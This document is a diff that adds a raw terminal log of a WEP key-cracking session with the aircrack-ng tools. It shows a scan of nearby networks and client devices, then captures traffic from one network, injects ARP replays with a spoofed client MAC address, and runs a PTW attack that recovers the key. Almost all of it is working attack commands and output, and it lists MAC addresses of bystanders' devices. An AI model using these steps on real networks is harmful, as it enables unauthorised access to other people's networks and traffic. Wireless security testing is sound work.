@@ -1,0 +1,84 @@
+ CH 10 ][ Elapsed: 1 min ][ 2008-01-31 01:41
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:18:39:D4:08:99   31      135      100    0  11  48  WEP  WEP         linksys
+ 00:0B:85:70:F4:BD   22      158        0    0   1  54. WPA2 CCMP   MGT  du-public-wpa2
+ 00:0B:85:70:F4:BE   18      153        0    0   1  54. OPN              du-public
+ 00:0B:85:70:F6:FE   12      113       34    0   1  54. OPN              du-public
+ 00:0B:85:70:F6:FD   12      116        0    0   1  54. WPA2 CCMP   MGT  du-public-wpa2
+ 00:0B:85:71:BD:1D   15      100        0    0  11  54. WPA2 CCMP   MGT  du-public-wpa2
+ 00:0B:85:71:BD:1E   15      109        5    0  11  54. OPN              du-public
+ 00:0B:85:89:77:7D    6       58        0    0  11  54. WPA2 CCMP   MGT  du-public-wpa2
+ 00:0B:85:70:F0:BD    5       79        0    0   1  54. WPA2 CCMP   MGT  du-public-wpa2
+ 00:0B:85:70:F0:BE    4       74        0    0   1  54. OPN              du-public
+ 00:0B:85:89:77:7E    6       71        0    0  11  54. OPN              du-public
+ 00:0B:85:71:BC:DE   -1        0        0    0  11  -1                   <length:  0>
+ 00:0B:85:70:F7:9D    1        1        0    0   1  54. WPA2 CCMP   MGT  du-public-wpa2
+
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes
+
+ 00:18:39:D4:08:99  00:0E:35:BC:52:72   36  24- 1     0      150  linksys
+ 00:0B:85:70:F6:FE  00:90:4B:A4:C0:EB   23  48-54     0       28
+ 00:0B:85:70:F6:FE  00:16:CE:78:DE:63   17  24- 1     0       35  du-public
+ 00:0B:85:71:BD:1E  00:14:A5:1E:4D:CD   -1  24- 0     0        5
+ 00:0B:85:70:F0:BE  00:13:CE:D0:F3:B2   14   0- 1   143      243  du-public
+ 00:0B:85:89:77:7E  00:19:D2:4E:08:8B    6   0- 2     0        7  du-public
+ (not associated)   00:1B:77:16:44:19   35   0- 1     0        3  du-public
+ (not associated)   00:14:A5:D2:D2:B3   19   0- 1     0        1
+ (not associated)   00:13:02:B7:0F:35   13   0- 1     0       66  <Ingen aktuell ssid>
+ (not associated)   00:0E:35:50:DB:A5    6   0- 1     0       11
+ (not associated)   00:90:96:C7:66:2A    3   0- 1     0        5
+ (not associated)   00:1C:BF:73:91:A3    3   0- 1    24        4
+ (not associated)   00:18:DE:56:2F:06    1   0- 1     0        1  du-public
+ (not associated)   00:13:E8:73:46:D9    1   0- 1     0        4  belkin54g
+ (not associated)   00:90:4B:23:5A:80   -1   0- 1     0        3
+ (not associated)   00:13:E8:73:A9:33   -1   0- 1     0       11  default
+ (not associated)   00:16:6F:9B:B9:6F    1   0- 1     0        2  Haganas Airborne
+ 00:0B:85:71:BC:DE  00:19:D2:D2:01:7E   14   0-48     0        3
+
+
+airodump-ng --channel 11 --bssid 00:18:39:D4:08:99 --write capfile ath0
+
+ CH 11 ][ Elapsed: 3 mins ][ 2008-01-31 01:53 ][ interface ath0 down
+
+ BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:18:39:D4:08:99   31   0     2216    51537  440  11  48  WEP  WEP    OPN  linksys
+
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes
+
+ 00:18:39:D4:08:99  00:0E:35:BC:52:72   33   5- 1     5    70594
+
+
+aireplay-ng --arpreplay -b 00:18:39:D4:08:99 -h 00:0E:35:BC:52:72 ath0
+
+bt ~ # aireplay-ng --arpreplay -b 00:18:39:D4:08:99 -h 00:0E:35:BC:52:72 ath0
+The interface MAC (00:1D:7D:38:EE:F0) doesn't match the specified MAC (-h).
+        ifconfig ath0 hw ether 00:0E:35:BC:52:72
+01:51:37  Waiting for beacon frame (BSSID: 00:18:39:D4:08:99) on channel 11
+Saving ARP requests in replay_arp-0131-015137.cap
+You should also start airodump-ng to capture replies.
+Read 80173 packets (got 39923 ARP requests and 1 ACKs), sent 38628 packets...(499 pps)
+
+aircrack-ng -b 00:18:39:D4:08:99 capturefile-01.cap
+
+bt ~ # aircrack-ng -b 00:18:39:D4:08:99 capturefile-01.cap
+Opening capturefile-01.cap
+Attack will be restarted every 5000 captured ivs.
+Starting PTW attack with 51682 ivs.
+
+                                            Aircrack-ng 1.0 beta1 r857
+
+
+                            [00:00:00] Tested 4 keys (got 50515 IVs)
+
+   KB    depth   byte(vote)
+    0    0/  1   01(72192) 26(63744) 6D(60416) B1(58880) 20(58624) B3(58368) B7(57344)
+    1    0/  1   23(75008) A4(61440) 78(60160) 0F(59392) 13(59392) CC(59136) 3E(58624)
+    2    0/  3   80(65024) 2A(60416) 69(60160) 97(59904) 1E(58880) 89(58880) 9C(58624)
+    3    0/  1   67(67840) B2(62464) FD(60672) 20(59648) 67(59136) A8(59136) DA(58368)
+    4    0/  1   89(75264) B1(60160) 62(59904) 35(59648) 2F(58880) AC(58624) 56(57856)
+
+                         KEY FOUND! [ 01:23:45:67:89 ]
+        Decrypted correctly: 100%
